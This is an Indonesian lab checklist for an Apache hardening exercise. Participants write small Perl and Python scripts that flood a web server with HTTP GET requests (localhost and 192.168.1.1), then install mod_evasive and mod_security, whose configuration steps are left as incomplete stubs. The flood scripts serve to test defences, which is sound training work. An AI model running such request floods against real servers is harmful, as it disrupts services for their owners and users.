## Peserta harus bisa buktikan log percobaan DOS yang dibuat sendiri
- membuat file ddos menggunakan bahasa pemograman perl ✓
    - nano ddos.pl
        ```
        #!/usr/bin/perl
        # test.pl: a small perl script that test's mod_dosevasive's effectiveness

        use IO::Socket;
        use strict;

        for(0..100) {
            my($response);
            my($SOCKET) = new IO::Socket::INET( 
                Proto   => "tcp",
                PeerAddr=> "127.0.0.1:80"
            );

            if (! defined $SOCKET) { die $!; }
            print $SOCKET "GET /?$_ HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n";
            $response = <$SOCKET>;
            print $response;
            close($SOCKET);
        }
        ```
- membuat file ddos menggunakan bahasa pemograman python
    - nano ddos.py
        ```
        import socket

        target_ip = "192.168.1.1" # IP address of the target system
        target_port = 80 # Port number of the target system
        message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip).encode() # HTTP GET request

        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the target system
        client_socket.connect((target_ip, target_port))

        # Send the HTTP GET request repeatedly
        while True:
            client_socket.send(message)
        ```

## Instalasi Konfigurasi Module ModEvasive
    - yum install mod_evasive

## Customisasi Parameter ModEvasive
    - nano /etc/httpd/conf.d/

## Instalasi Konfigurasi Module ModSecurity
    - yum install mod_security

## Customisasi Parameter / Rule ModSecurity
    - nano /etc/httpd/conf.d/